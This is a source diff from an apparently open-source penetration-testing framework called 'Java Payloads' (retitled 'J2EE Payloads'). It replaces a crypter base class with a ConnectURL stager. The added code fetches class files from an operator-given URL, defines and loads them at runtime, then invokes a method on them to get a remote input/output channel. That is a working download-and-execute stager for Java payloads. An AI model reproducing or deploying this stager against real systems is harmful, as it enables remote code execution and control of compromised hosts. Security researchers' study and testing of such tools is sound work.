@@ -1,5 +1,5 @@
 /*
- * Java Payloads.
+ * J2EE Payloads.
  * 
  * Copyright (c) 2012 Michael 'mihi' Schierl
  * All rights reserved.
@@ -32,29 +32,33 @@
  * USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
  */
 
-package javapayload.crypter;
+package javapayload.stager;
 
-import java.io.PrintStream;
+import java.io.DataInputStream;
+import java.io.InputStream;
+import java.io.OutputStream;
+import java.net.URL;
 
-import javapayload.Module;
-import javapayload.Parameter;
+public class ConnectURL extends Stager {
 
-public abstract class Crypter extends Module {
-
-	public Crypter(String summary, String description) {
-		super(null, Crypter.class, summary, description);
+	public void bootstrap(String[] parameters, boolean needWait) throws Exception {
+		String baseURL = parameters[1];
+		String token = "s" + parameters[2];
+		String timeout = parameters[3];
+		final DataInputStream in = new DataInputStream(new URL(baseURL + "?bs=1").openStream());
+		Class clazz;
+		int length = in.readInt();
+		do {
+			final byte[] classfile = new byte[length];
+			in.readFully(classfile);
+			clazz = define(classfile);
+			length = in.readInt();
+		} while (length > 0);
+		Class str = Class.forName("java.lang.String");
+		Object[] streams = (Object[]) clazz.getMethod("go", new Class[] { str, str, str }).invoke(null, new Object[] { baseURL, token, timeout });
+		bootstrap((InputStream) streams[0], (OutputStream) streams[1], parameters);
 	}
 
-	public final Parameter[] getParameters() {
-		throw new UnsupportedOperationException("Parameters not available for crypters");
+	public void waitReady() throws InterruptedException {
 	}
-	
-	public String getNameAndParameters() {
-		return getName();
-	}
-	
-	public void printParameterDescription(PrintStream out) {
-	}
-
-	public abstract byte[] crypt(String className, byte[] innerClassBytes) throws Exception;
 }
